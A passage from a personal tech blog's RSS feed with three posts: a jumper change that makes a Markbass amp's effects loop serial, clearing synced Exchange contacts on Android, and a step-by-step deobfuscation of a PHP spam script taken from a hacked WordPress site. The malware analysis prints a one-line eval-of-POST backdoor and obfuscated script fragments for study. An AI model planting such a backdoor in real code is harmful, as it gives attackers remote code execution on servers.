+<p><figure id="attachment_293" aria-describedby="figcaption_attachment_293" class="wp-caption aligncenter" ><a href="https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-overview.jpeg"><img decoding="async" class="wp-image-293 size-medium" src="https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-overview-300x255.jpeg" alt="Markbass Little Mark III effects loop - innards overview" width="300" height="255" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-overview-300x255.jpeg 300w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-overview-1024x870.jpeg 1024w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-overview-150x127.jpeg 150w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-overview-768x652.jpeg 768w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-overview-1536x1304.jpeg 1536w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-overview.jpeg 2048w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption id="figcaption_attachment_293" class="wp-caption-text">Overview &#8211; click to enlarge</figcaption></figure></p>
+<p>In the picture above, I&#8217;ve marked two locations of jumpers on the boards with the numbers 1 and 2:</p>
+<ol>
+<li>Jumper CN7 with labels &#8220;PARALL&#8221; and &#8220;SERIES&#8221; on the rear board</li>
+<li>Jumper CN2 on the front board</li>
+</ol>
+<p>Find jumper CN7 located on the rear board between the send and return sockets. Use a pair of needle-nose pliers to gently move the jumper over to the &#8220;SERIES&#8221; position. Don&#8217;t be afraid to apply a little force to get it out of the silicone sealant. It should look like this:</p>
+<p><figure id="attachment_294" aria-describedby="figcaption_attachment_294" class="wp-caption aligncenter" ><a href="https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn7.jpeg"><img loading="lazy" decoding="async" class="wp-image-294 size-medium" src="https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn7-300x186.jpeg" alt="Markbass Little Mark III effects loop - jumper CN7" width="300" height="186" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn7-300x186.jpeg 300w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn7-1024x635.jpeg 1024w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn7-150x93.jpeg 150w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn7-768x476.jpeg 768w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn7-1536x953.jpeg 1536w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn7.jpeg 2048w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a><figcaption id="figcaption_attachment_294" class="wp-caption-text">Jumper CN7 &#8211; click to enlarge</figcaption></figure></p>
+<p>Find jumper CN2 on the front board between the clip light and the low EQ knob. This time we want to remove the sealant-covered jumper; I usually place it on just one pin so I don&#8217;t have a jumper lying around:</p>
+<p><figure id="attachment_295" aria-describedby="figcaption_attachment_295" class="wp-caption aligncenter" ><a href="https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn2.jpeg"><img loading="lazy" decoding="async" class="wp-image-295 size-medium" src="https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn2-300x191.jpeg" alt="Markbass Little Mark III effects loop - jumper CN2" width="300" height="191" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn2-300x191.jpeg 300w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn2-1024x653.jpeg 1024w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn2-150x96.jpeg 150w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn2-768x490.jpeg 768w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn2-1536x980.jpeg 1536w, https://jelleraaijmakers.nl/wp-content/uploads/2017/01/markbass-little-mark-jumper-cn2.jpeg 2048w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a><figcaption id="figcaption_attachment_295" class="wp-caption-text">Jumper CN2 &#8211; click to enlarge</figcaption></figure></p>
+<p>That&#8217;s it, put the amp back together and you&#8217;re set!</p>
+<h2>Why is the effects loop parallel by default?</h2>
+<p>On <a href="http://www.markbass.it/support/warranty/">Markbass&#8217; support page</a>, they state:</p>
+<blockquote><p><strong>Can I change the effect send/return from parallel to serial?<br />
+</strong>The effects loop on Markbass amps is factory set to parallel so that your sound is not degraded as it passes through the effects, and also so that if something happens to one of your effects or batteries or cables in the effect chain, you won&#8217;t lose your signal. However, if you would like to change the wiring to serial, this can be done by qualified Markbass service technicians only. Contact your local dealer or distributor for details.</p></blockquote>
+<p>Because the effects loop works in parallel by default and there is no way to adjust the mix of these signals, you&#8217;re stuck with a 50/50 blend.</p>
+<p>By changing the effects loop to series, you&#8217;re effectively using 100% of the return signal of your effect chain as input for the equalizer and power amp. Because the effects loop sits between the preamp gain and the equalizer, you can use that gain to modify the input signal for your effect chain.</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2017/01/effects-loop-parallel-series-markbass">Effects loop: parallel to series for Markbass LM III</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Android: remove synced Exchange contacts</title>
+		<link>https://jelleraaijmakers.nl/2016/10/android-remove-synced-exchange-contacts</link>
+		
+		<dc:creator><![CDATA[Jelle]]></dc:creator>
+		<pubDate>Sun, 16 Oct 2016 20:41:16 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Android]]></category>
+		<category><![CDATA[CardDAV]]></category>
+		<category><![CDATA[Phone]]></category>
+		<guid isPermaLink="false">https://jelleraaijmakers.nl/?p=264</guid>
+
+					<description><![CDATA[<p>Since I &#8220;crossed over&#8221; to an Android phone for the first time after using iPhones for several years, I have had the pleasure of rediscovering how to configure my phone to do everything I always took for granted. One thing that surprised me is that my Exchange contacts showed up in my phone app, although I had disabled their synchronization. In [&#8230;]</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2016/10/android-remove-synced-exchange-contacts">Android: remove synced Exchange contacts</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Since I &#8220;crossed over&#8221; to an Android phone for the first time after using iPhones for several years, I have had the pleasure of rediscovering how to configure my phone to do everything I always took for granted. One thing that surprised me is that my Exchange contacts showed up in my phone app, although I had disabled their synchronization.</p>
+<p><span id="more-264"></span></p>
+<p>In my case I was using the Gmail app, but almost every app that provides a synchronization account of any kind (such as <a href="https://bluemail.me/">BlueMail</a> or <a href="https://davdroid.bitfire.at/">DAVdroid</a>) exhibits the same behavior that seems weird if you&#8217;re used to iOS: contacts will show up on your phone regardless of whether you chose to synchronize them. Whereas iOS has a very binary view of synchronization accounts &#8211; contacts are either synced or do not appear at all &#8211; Android will just give you the option to keep your contacts synced with your account, or just let them sit there.</p>
+<p>My contact list is updated using <a href="https://en.wikipedia.org/wiki/CardDAV">CardDAV </a>with another account, so I didn&#8217;t want Exchange interfering with my list. Fortunately, I discovered that it is possible to remove all the contacts present on my phone, which only was a valid solution because I did not have any locally stored contacts. Here&#8217;s what I did to solve the issue:</p>
+<h3>Remove synced contacts from Android</h3>
+<p class="info">These instructions apply to Android 6.0.1 and might not work for newer versions.</p>
+<p class="warning"><strong>Huge warning:</strong> this will remove all locally stored contacts from your phone. Make sure to back them up first, so you can get as irresponsible and reckless as possible.</p>
+<ol>
+<li>Set up your Exchange account</li>
+<li>Go to <em>Settings</em> &gt; <em>Accounts</em> &gt; <em>Exchange</em> &gt; <em>(Your account)</em></li>
+<li>Disable the <em>Contacts</em> synchronization<br />
+<a href="https://jelleraaijmakers.nl/wp-content/uploads/2016/10/exchange-contacts-disabled.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-269 size-medium" src="https://jelleraaijmakers.nl/wp-content/uploads/2016/10/exchange-contacts-disabled-300x172.png" alt="Android account Exchange: disable contacts sync" width="300" height="172" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2016/10/exchange-contacts-disabled-300x172.png 300w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/exchange-contacts-disabled-1024x586.png 1024w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/exchange-contacts-disabled-150x86.png 150w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/exchange-contacts-disabled-768x439.png 768w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/exchange-contacts-disabled.png 1080w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></li>
+<li>Go back to <em>Settings</em> &gt; <em>Apps</em></li>
+<li>Open the overflow icon in the top right and tap <em>Show system</em></li>
+<li>Scroll down to the <em>Contacts Storage</em> app and tap it<br />
+<a href="https://jelleraaijmakers.nl/wp-content/uploads/2016/10/contacts-apps.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-270 size-medium" src="https://jelleraaijmakers.nl/wp-content/uploads/2016/10/contacts-apps-300x116.png" alt="Android Contacts apps" width="300" height="116" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2016/10/contacts-apps-300x116.png 300w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/contacts-apps-1024x394.png 1024w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/contacts-apps-150x58.png 150w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/contacts-apps-768x296.png 768w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/contacts-apps.png 1080w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></li>
+<li>Tap <em>Storage</em></li>
+<li>Tap <em>Clear Data</em><em><br />
+<a href="https://jelleraaijmakers.nl/wp-content/uploads/2016/10/android-contacts-storage-clear.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-271 size-medium" src="https://jelleraaijmakers.nl/wp-content/uploads/2016/10/android-contacts-storage-clear-300x277.png" alt="Android Contacts Storage: clear data" width="300" height="277" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2016/10/android-contacts-storage-clear-300x277.png 300w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/android-contacts-storage-clear-1024x945.png 1024w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/android-contacts-storage-clear-150x138.png 150w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/android-contacts-storage-clear-768x709.png 768w, https://jelleraaijmakers.nl/wp-content/uploads/2016/10/android-contacts-storage-clear.png 1080w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></em></li>
+<li>Pray (optional)</li>
+</ol>
+<p>The next time you open either your Contacts or Phone app, it kicks off a sync job and your contacts list is rebuilt using only the accounts with enabled synchronization. <em>Awesome</em>.</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2016/10/android-remove-synced-exchange-contacts">Android: remove synced Exchange contacts</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Dissecting a spammer&#8217;s spam script</title>
+		<link>https://jelleraaijmakers.nl/2016/04/dissecting-spammers-spam-script</link>
+		
+		<dc:creator><![CDATA[Jelle]]></dc:creator>
+		<pubDate>Sun, 17 Apr 2016 23:30:52 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Programming]]></category>
+		<category><![CDATA[Servers]]></category>
+		<category><![CDATA[Spam]]></category>
+		<guid isPermaLink="false">https://jelleraaijmakers.nl/?p=206</guid>
+
+					<description><![CDATA[<p>Let&#8217;s take a look at a PHP script used to send spam. These types of scripts run on servers all over the world and might give you some insight into a spammer&#8217;s dedication to annoy the hell out of you. Spammers abuse known flaws in unsecured websites and applications to break into a server and [&#8230;]</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2016/04/dissecting-spammers-spam-script">Dissecting a spammer&#8217;s spam script</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Let&#8217;s take a look at a PHP script used to send spam. These types of scripts run on servers all over the world and might give you some insight into a spammer&#8217;s dedication to annoy the hell out of you.</p>
+<p><span id="more-206"></span></p>
+<p>Spammers abuse known flaws in unsecured websites and applications to break into a server and install scripts that are able to send loads of spam. This is one of the reasons why it&#8217;s hard to get rid of <em>all</em> spam: determining absolute trust in a sender is hard to achieve, since a fully hardened server can be a Swiss cheese a few zero-day exploits later.</p>
+<p>Everyone running a mildly popular WordPress site knows that exploits can be really easily introduced by installing plugins from a less than reputable source &#8211; or by not keeping your plugins up to date. Sometimes, a zero-day exploit for a popular WordPress plugin is exposed and thousands of installations worldwide are infected instantly.</p>
+<p>One of the WordPress sites on a shared hosting web server I manage was infected by a spam script. Fortunately, the script was unable to do any real damage and was detected within half an hour of infection. I thought it would be fun to show you the script and dissect it, to find out exactly how these things work and make thousands of email administrators&#8217; lives a living hell.</p>
+<h2>Website infection</h2>
+<p>Infection of a website by a spammer is almost always performed by their botnet. The nodes coordinate attacks and will try to perform these three actions from different IP addresses:</p>
+<ol>
+<li>Abuse an exploit in order to install a minimal script: <code class="EnlighterJSRAW" data-enlighter-language="php">eval($_POST['input_from_spammer']);</code></li>
+<li>This script, usually edited into one of WordPress&#8217; or plugin&#8217;s publically accessible PHP files, is executed many times with different inputs to install even more of these evaluation scripts</li>
+<li>Finally, when a website is compromised up to the point where fixing it manually is not really an option anymore, obfuscated hacking and spamming scripts are installed</li>
+</ol>
+<p>Steps 1 and 2 are used to make sure the website remains compromised, even if an administrator decides to reinstall the website or restore a backup (without checking <em>all</em> the locations where the spammer had access to). Step 3 results in a few easily recognizable script files that perform the dirty work.</p>
+<p>Why wouldn&#8217;t they just stop after step 1 and just inject the spam scripts through the <code class="EnlighterJSRAW" data-enlighter-language="php">eval()</code> mechanism? My guess would be that to keep a low(er) profile, uploading a big script once and then just sending the necessary spamming information over in a minimal format is better when you&#8217;re trying to hide your actions.</p>
+<h2>Deobfuscating the spam script</h2>
+<h3>Step 1: determine method of obfuscation</h3>
+<p>So let&#8217;s take a look at <a href="/wp-content/uploads/2016/04/step-01-original-script.txt">the unaltered, obfuscated script</a> as it was found in the exploited installation of WordPress.</p>
+<p>The first thing I noticed was that everything was squeezed onto one long messy line. The next obvious deduction is that some kind of transcoding is going on:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$GLOBALS['jihux92'] = $j10[86].$j10[62].$j10[86].$j10[64].$j10[73].$j10[27].$j10[19]; $GLOBALS['qsxte55'] = $j10[27].$j10[0].$j10[0].$j10[15].$j10[0].$j10[64].$j10[0].$j10[27].$j10[39].$j10[15].$j10[0].$j10[19].$j10[86].$j10[62].$j10[79]; $GLOBALS['eexet82'] = $j10[30].$j10[73].$j10[15].$j10[62].$j10[64].$j10[33].$j10[27].$j10[6].$j10[15].$j10[33].$j10[27]; $GLOBALS['cydwn23'] = $j10[93].$j10[92].$j10[93].$j10[33].$j10[12].$j10[87].$j10[87]; $GLOBALS['dmvah16'] = $j10[33].$j10[27].$j10[56].$j10[86].$j10[62].$j10[27];
+// etcetera</pre>
+<p>My next steps would be to make this mess a bit more readable and try to reverse the transcoding used for pretty much everything.</p>
+<h3>Step 2: introduce newlines</h3>
+<p>I replace every semicolon with a semicolon followed by a newline. This gives me a better overview of some of the things that take place:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$GLOBALS['dmvah16'] = $j10[33].$j10[27].$j10[56].$j10[86].$j10[62].$j10[27];
+$GLOBALS['uvmxr50'] = $j10[86].$j10[73].$j10[30].$j10[33].$j10[62].$j10[87].$j10[90];
+$GLOBALS['oluxf50'] = $j10[54].$j10[57].$j10[16].$j10[54].$j10[86].$j10[50].$j10[80];
+$GLOBALS['gyeof37'] = $j10[16].$j10[33].$j10[5];
+$GLOBALS['frpwz79'] = $j10[6].$j10[15].$j10[57].$j10[62].$j10[19];
+$GLOBALS['yguel83'] = $j10[19].$j10[86].$j10[16].$j10[27];
+$GLOBALS['vrubd73'] = $j10[6].$j10[15].$j10[62].$j10[73].$j10[19].$j10[38].$j10[62].$j10[19];
+$GLOBALS['cnftt27'] = $j10[16].$j10[52].$j10[33].$j10[19].$j10[61].$j10[55].$j10[53];
+$GLOBALS['lfazz33'] = $j10[54].$j10[33].$j10[15].$j10[61].$j10[52].$j10[55].$j10[55];
+$GLOBALS['haimq43'] = $j10[92].$j10[79].$j10[0].$j10[19].$j10[0].$j10[80];
+$GLOBALS['xfeye26'] = $j10[86].$j10[16].$j10[39].$j10[75].$j10[15].$j10[33].$j10[27];
+$GLOBALS['whzhh71'] = $j10[38].$j10[0].$j10[0].$j10[38].$j10[20].$j10[64].$j10[93].$j10[27].$j10[20].$j10[73];
+$GLOBALS['bqdjr8'] = $j10[0].$j10[15].$j10[9].$j10[16].$j10[38].$j10[50].$j10[53];
+$GLOBALS['uulbr4'] = $j10[16].$j10[15].$j10[86].$j10[30].$j10[93].$j10[90].$j10[87];
+$GLOBALS['nqqaa78'] = $j10[27].$j10[93].$j10[75].$j10[7].$j10[20].$j10[90].$j10[90];
+$GLOBALS['mdxuq1'] = $j10[0].$j10[61].$j10[54].$j10[62].$j10[7].$j10[53];</pre>
+<p>Some <a href="https://secure.php.net/manual/en/reserved.variables.globals.php">global assignments</a>, probably used to share variables between function invocations without actually passing those variables as arguments. I discover two separate declarations of variables at the top of the script:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$pate="eyIubXguYW9sLm ...... hbSBwZXIiXX19fQ==";
+$j10="rA;@{5cqVb/Fh&lt;\"omGQtyHMZ`Y[eB&amp;j] dO%W'ap-I!?1X\n^9L7Nx6z4fu}S*wn\r_=JU\t(E\\~s&gt;lR.Kg3C)|:Ti8#\$20vkD+P,";</pre>
+<p>The two equals signs at the end of the $pate value look like <a href="https://en.wikipedia.org/wiki/Base64">base64</a> padding. The value of the $j10 variable looks completely random.</p>
+<h3>Step 3: replace the $j10 values</h3>
+<p>It looks like the variable $j10 is accessed a lot, and almost always in the context of string concatenation. This seems like a perfect candidate for some reverse transcoding! I ran the entire script through the decoder below:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$j10="rA;@{5cqVb/Fh&lt;\"omGQtyHMZ`Y[eB&amp;j] dO%W'ap-I!?1X\n^9L7Nx6z4fu}S*wn\r_=JU\t(E\\~s&gt;lR.Kg3C)|:Ti8#\$20vkD+P,";
+
+$data = file_get_contents($argv[1]);
+
+for ($i = 0; $i &lt; strlen($j10); ++$i) {
+    $char = $j10[$i];
+    $data = str_replace('$j10[' . $i . ']', '"' . addcslashes($char, "\r\n\"\\\t") . '"', $data);
+}
+
+echo $data;</pre>
+<p>That bit from step 2 now looks like this:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$GLOBALS['dmvah16'] = "d"."e"."f"."i"."n"."e";
+$GLOBALS['uvmxr50'] = "i"."s"."j"."d"."n"."8"."2";
+$GLOBALS['oluxf50'] = "z"."u"."m"."z"."i"."7"."3";
+$GLOBALS['gyeof37'] = "m"."d"."5";
+$GLOBALS['frpwz79'] = "c"."o"."u"."n"."t";
+$GLOBALS['yguel83'] = "t"."i"."m"."e";
+$GLOBALS['vrubd73'] = "c"."o"."n"."s"."t"."a"."n"."t";
+$GLOBALS['cnftt27'] = "m"."x"."d"."t"."w"."4"."6";
+$GLOBALS['lfazz33'] = "z"."d"."o"."w"."x"."4"."4";
+$GLOBALS['haimq43'] = "v"."g"."r"."t"."r"."3";
+$GLOBALS['xfeye26'] = "i"."m"."p"."l"."o"."d"."e";
+$GLOBALS['whzhh71'] = "a"."r"."r"."a"."y"."_"."k"."e"."y"."s";
+$GLOBALS['bqdjr8'] = "r"."o"."b"."m"."a"."7"."6";
+$GLOBALS['uulbr4'] = "m"."o"."i"."j"."k"."2"."8";
+$GLOBALS['nqqaa78'] = "e"."k"."l"."q"."y"."2"."2";
+$GLOBALS['mdxuq1'] = "r"."w"."z"."n"."q"."6";</pre>
+<p>Success! Some of these are references to PHP functions, let&#8217;s see how they are being used in the rest of the script:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$GLOBALS['gyeof37'](0987654321)
+
+// translates to:
+
+"md5"(0987654321)
+
+// which is the equivalent of:
+
+md5(0987654321)</pre>
+<p>The spammers employ the use of PHP&#8217;s <a href="https://secure.php.net/manual/en/functions.variable-functions.php">variable functions</a> so they can hide which functions they call. They can do this for all function invocations, both user-defined and built-in functions. Some PHP code might look like function invocations, but are actually language constructs (such as <code class="EnlighterJSRAW" data-enlighter-language="php">isset()</code> ):</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">if (!isset($vcmra37) || $vcmra37 == "") {</pre>
+<p>So I discover that not only did they hide their function invocations, they also obfuscated all variable names: $vcmra37 does not look like an intuitive name for a variable. I need to deal with both types of obfuscation in the next steps.</p>
+<h3>Step 4: concatenate constant strings</h3>
+<p>Because I&#8217;ve simply replaced all instances of $j10[&#8230;] with the corresponding value, the script now contains a lot of concatenations of constant strings. It&#8217;s time to simplify those with the following sed invocation:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">sed -e 's/"\."//g' input-script.php &gt; output-script.php</pre>
+<p>This misses a few edge cases, but after tiny fixes at lines 356, 472 and 519 I end up with a parseable PHP script. Let&#8217;s see how those $GLOBALS declarations look like now:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$GLOBALS['dmvah16'] = "define";
+$GLOBALS['uvmxr50'] = "isjdn82";
+$GLOBALS['oluxf50'] = "zumzi73";
+$GLOBALS['gyeof37'] = "md5";
+$GLOBALS['frpwz79'] = "count";
+$GLOBALS['yguel83'] = "time";
+$GLOBALS['vrubd73'] = "constant";
+$GLOBALS['cnftt27'] = "mxdtw46";
+$GLOBALS['lfazz33'] = "zdowx44";
+$GLOBALS['haimq43'] = "vgrtr3";
+$GLOBALS['xfeye26'] = "implode";
+$GLOBALS['whzhh71'] = "array_keys";
+$GLOBALS['bqdjr8'] = "robma76";
+$GLOBALS['uulbr4'] = "moijk28";
+$GLOBALS['nqqaa78'] = "eklqy22";
+$GLOBALS['mdxuq1'] = "rwznq6";</pre>
+<p>Great! Suddenly, pieces of code are starting to make sense:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$uiwvy47["s_header"] = "Date: " . @$GLOBALS['xzfoh12']("D, j M Y G:i:s O")."\r\n";</pre>
+<p>I still need to deal with those pesky invocations on string values found in the $GLOBALS array. Let&#8217;s do that now.</p>
+<h3>Step 5: replace function invocations</h3>
+<p>I wrote a script to replace all <code class="EnlighterJSRAW" data-enlighter-language="php">$GLOBALS['foo'](...)</code> invocations with their function equivalents, and at the same time remove the original $GLOBALS assignment:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$data = file_get_contents($argv[1]);
+
+// Match all 'global' functions
+$matches = [];
+preg_match_all('#\\$GLOBALS\\[\'(.+?)\'\\] = "(.+?)";\\r\\n#', $data, $matches, PREG_SET_ORDER);
+
+foreach ($matches as $match) {
+    $obfuscatedName = $match[1];
+    $actualName = $match[2];
+
+    // Replace all function invocations
+    $data = str_replace('$GLOBALS[\'' . $obfuscatedName . '\'](', $actualName . '(', $data);
+
+    // Remove the obfuscation mapping
+    $data = str_replace($match[0], '', $data);
+}
+
+echo $data;</pre>
+<p>So let&#8217;s see how the &#8220;xzfoh12&#8221; is doing after the spam script I have so far is pulled through the above decoder:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$uiwvy47["s_header"] = "Date: " . @date("D, j M Y G:i:s O")."\r\n";</pre>
+<p>Awesome! I now have a simple <code class="EnlighterJSRAW" data-enlighter-language="php">date(...) </code>invocation. Pieces of code are starting to reveal their true nature:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">// ...
+case constant("SOCKET_TYPE_FSOCKET"): $jxykg73 = @fsockopen($hpzaj3."://".$urvjq67, $fgzke40, $bfwyd21, $iiwxg60, $zcxlk81);
+if ($jxykg73 &amp;&amp; $jlfho78) { @stream_set_blocking($jxykg73, 0);
+} @stream_set_timeout($jxykg73, $zcxlk81);
+break;
+// ...</pre>
+<h3>Step 6: prettify the PHP code</h3>
+<p>Since I got the feeling that I was getting close to understanding what the script does, I used an online PHP prettifier called the <a href="http://beta.phpformatter.com/">Spark Labs PHP Formatter</a> to clean up the script I had up until now. This helps immensely with understanding the general structure of the code; the previous excerpt now looks like this:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">// ...
+        case constant("SOCKET_TYPE_FSOCKET"):
+            $jxykg73 = @fsockopen($hpzaj3 . "://" . $urvjq67, $fgzke40, $bfwyd21, $iiwxg60, $zcxlk81);
+            if ($jxykg73 &amp;&amp; $jlfho78) {
+                @stream_set_blocking($jxykg73, 0);
+            }
+            @stream_set_timeout($jxykg73, $zcxlk81);
+            break;
+// ...</pre>
+<p>Although function and variable names are still obfuscated, I begin to see what functions were designed to do based on the PHP built-in functions they call and the constant string and integer values they use. Take a look for yourself in <a href="/wp-content/uploads/2016/04/step-06-prettify.txt">the prettified script</a>.</p>
+<h3>Step 7: remove default $j10 argument</h3>
+<p>Instead of making $j10 a global variable, the spammer decided to pass the value along with every invocation of the user-defined functions. A quick check reveals that $j10 is not used anymore, since I replaced all accesses to that variable in step 3. Alright, some sed magic to make all those parameters disappear:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">sed -e 's/(\$j10, /(/g' input-script.php &gt; output-script.php</pre>
+<p>Following this modification, I manually remove the $j10 assignment at the top of the script.</p>
+<h3>Step 8: decode the $pate payload</h3>
+<p>I decide that to understand what the code is doing, I need to be able to look inside the $pate payload at the top of the script. Let&#8217;s take a look at how it&#8217;s used:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$pate = "eyIubXguY...X19fQ==";
+
+$lerqj48 = json_decode(kvkdh88($pate), TRUE);
+
+function kvkdh88($xmxkd83) {
+    $fupzm37 = "";
+    for ($hvyut10 = 0; $hvyut10 &lt; 256; $hvyut10++) {
+        $gzccs73[$hvyut10] = chr($hvyut10);
+    }
+    $hgtxt70 = array_flip(preg_split("//", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", -1, 1));
+    $qmmlq58 = array();
+    preg_match_all("([A-z0-9+\\/]{1,4})", $xmxkd83, $qmmlq58);
+    foreach ($qmmlq58[0] as $iejib94) {
+        $hzgqj17 = 0;
+        for ($hvyut10 = 0; isset($iejib94[$hvyut10]); $hvyut10++) {
+            $hzgqj17 = ($hzgqj17 &lt;&lt; 6) + $hgtxt70[$iejib94[$hvyut10]];
+            if ($hvyut10 &gt; 0) {
+                $fupzm37 .= $gzccs73[$hzgqj17 &gt;&gt; (4 - (2 * ($hvyut10 - 1)))];
+                $hzgqj17 = $hzgqj17 &amp; (0xf &gt;&gt; (2 * ($hvyut10 - 1)));
+            }
+        }
+    }
+    return $fupzm37;
+}</pre>
+<p>So whatever comes out that kvkdh88 function must be a JSON string. Let&#8217;s see&#8230; that function applies a base64 character set, reads characters in blocks of at most 4 characters, some bit shifting going on&#8230; could this be a user-defined <a href="https://secure.php.net/manual/en/function.base64-decode.php">base64_decode()</a>?</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$pate = base64_decode("eyIubXguY...X19fQ==");
+print_r($pate);
+
+// output: '{".mx.aol.com":{...,"sr":["2 spam per"]}}}'</pre>
+<p>Yup, that&#8217;s it! I replace the $pate definition with the output I got and removed the kvkdh88 method altogether.</p>
+<h3>Step 9: replace $_POST references</h3>
+<p>At the top of the script, another simple obfuscation takes place:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$GLOBALS['xyzta42'] = ${"_POST"};</pre>
+<p>Let&#8217;s get rid of those:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$data = file_get_contents($argv[1]);
+
+// Remove definition
+$data = str_replace('$GLOBALS[\'xyzta42\'] = ${"_POST"};' . "\n", '', $data);
+
+// Replace usage
+$data = str_replace('$GLOBALS[\'xyzta42\']', '$_POST', $data);
+
+echo $data;</pre>
+<h3>Step 10: map function and variable names</h3>
+<p>After reading through the code I have now, I discover something really helpful: variable name obfuscation is the same throughout the script for the same variable names, i.e. all equivalent variable names were modified to the <em>same</em> obfuscated variable name. If I translate a single variable name correctly, it will probably be correct for the entire script!</p>
+<p>So I started translating function names and variable names, starting with the simpler functions and working up to the larger ones with lots of variables and function invocations &#8211; probably used for the overall spam logic. I put them in <a href="/wp-content/uploads/2016/04/step-10-mapping.txt">a JSON mapping file</a>:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="json">{
+    "functions": {
+        "rcptw89": "base64_xor2_decode",
+        "zdowx44": "base64_xor2_encode",
+        "fclwp59": "base64_xor2_url_decode_from_post",
+        "kdpdr2":  "connection_close",
+// ... a lot more ...
+
+        "imqjm17": "smtp_get_error",
+        "qbzer79": "smtp_parse_error_response",
+        "tvchy30": "smtp_read",
+        "rcljy83": "smtp_write"
+    },
+    "variables": {
+        "nbcnq11": "address",
+        "jxwad57": "conn_idx",
+        "uiwvy47": "connection_info",
+        "docef75": "connections",
+// ... a lot more ...
+
+        "lzjwd61": "spam_config",
+        "jxykg73": "sp",
+        "hbxeq24": "successful",
+        "zcxlk81": "timeout"
+    }
+}</pre>
